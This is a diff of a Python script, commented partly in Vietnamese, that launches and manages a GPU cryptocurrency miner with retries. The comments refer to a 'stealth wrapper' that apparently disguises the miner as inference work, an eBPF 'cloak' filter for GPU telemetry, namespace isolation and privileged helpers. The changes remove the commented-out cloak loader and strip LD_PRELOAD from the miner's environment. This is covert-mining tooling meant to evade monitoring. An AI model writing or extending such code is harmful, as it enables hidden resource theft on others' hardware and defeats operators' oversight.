@@ -125,21 +125,7 @@ def initialize_environment():
         # **Step 4: eBPF Filter Loading** (Bước 4: Tải bộ lọc eBPF) - DISABLED
         # DISABLE eBPF GPU telemetry để giải quyết lỗi std::bad_alloc
         logger.info("ℹ️ eBPF GPU telemetry đã được DISABLE để tránh memory conflicts")
-        # if os.getenv('ENABLE_EBPF_CLOAK', '1') == '1':
-        #     logger.info("🔧 Loading eBPF telemetry filter...")
-        #     preferred_path = "/opt/ebpf_filters/gpu_telemetry_filter.bpf.o"
-        #     legacy_path = "/opt/ebpf_filters/gpu_filter.o"
-        #     ebpf_path = preferred_path if os.path.exists(preferred_path) else legacy_path
-        #     
-        #     if os.path.exists(ebpf_path) and os.path.getsize(ebpf_path) > 0:
-        #         if privileged_manager.load_ebpf_program(ebpf_path):
-        #             logger.info("✅ Đã load eBPF telemetry filter thành công")
-        #         else:
-        #             logger.warning("⚠️ Không thể load eBPF telemetry filter")
-        #     else:
-        #         logger.info("ℹ️ eBPF filter object không tồn tại, chạy ở mock mode")
-        
-        # **Step 5: Environment Setup** (Bước 5: Thiết lập môi trường)
+
         logger.info("🌍 Running centralized environment setup...")
         setup_env.setup()
         logger.info("✅ Thiết lập môi trường thành công.")
@@ -547,7 +533,9 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
 
     # ✅ GPU Environment Cleanup now handled by stealth_inference_cuda.py internally
     # No need for subprocess_env preparation here - stealth wrapper handles it
-    subprocess_env = None  # Will use default environment (stealth wrapper creates clean_env)
+    # Tạo môi trường sạch, loại bỏ LD_PRELOAD để ngăn hook GPU làm sai cấu hình
+    subprocess_env = os.environ.copy()
+    subprocess_env.pop('LD_PRELOAD', None)
     
     for attempt in range(1, retries + 1):
         logger.info(f"Thử khởi chạy quá trình khai thác GPU (Lần thử {attempt}/{retries})...")
@@ -577,7 +565,7 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
                         stderr=subprocess.STDOUT,
                         universal_newlines=True,
                         bufsize=1,
-                        # Default environment (stealth wrapper handles cleanup internally)
+                        env=subprocess_env
                     )
                     logger.info(f"🔍 [DEBUG] subprocess.Popen completed successfully")
                     if process:
@@ -595,7 +583,7 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
                         stderr=subprocess.STDOUT,
                         universal_newlines=True,
                         bufsize=1,
-                        # Default environment (stealth wrapper handles cleanup internally)
+                        env=subprocess_env
                     )
             elif enable_ns and privileged_manager:
                 # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
@@ -606,7 +594,7 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
                     stderr=subprocess.STDOUT,
                     universal_newlines=True,
                     bufsize=1,
-                    # Default environment (stealth wrapper handles cleanup internally)
+                    env=subprocess_env
                 )
             else:
                 # **Standard subprocess** (tiến trình con tiêu chuẩn)
@@ -617,7 +605,7 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
                     stderr=subprocess.STDOUT,
                     universal_newlines=True,
                     bufsize=1,
-                    # Default environment (stealth wrapper handles cleanup internally)
+                    env=subprocess_env
                 )
             
             if process:
@@ -889,8 +877,6 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
     logger.error(f"Không thể khởi chạy quá trình khai thác GPU.")
     stop_event.set()
     return None
-
-# ✅ CPU MINER FUNCTION REMOVED: manage_cpu_miner() eliminated for GPU-only mining
 
 def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
     """
